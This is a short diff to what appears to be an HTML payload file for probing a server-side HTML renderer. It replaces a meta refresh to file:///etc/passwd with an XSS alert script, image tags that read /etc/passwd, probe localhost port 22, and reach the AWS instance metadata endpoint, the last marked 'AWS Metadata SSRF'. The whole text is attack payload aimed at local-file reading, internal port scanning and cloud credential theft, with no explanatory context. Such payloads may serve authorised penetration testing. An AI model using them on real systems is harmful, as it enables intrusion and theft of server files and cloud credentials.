@@ -1,1 +1,5 @@
-<meta http-equiv="refresh" content="0;url=file:///etc/passwd">
+<h1>Hello</h1>
+<script>alert(1)</script> <!-- May get stripped -->
+<img src="file:///etc/passwd">
+<img src="http://127.0.0.1:22">
+<img src="http://169.254.169.254/latest/meta-data/"> <!-- AWS Metadata SSRF -->
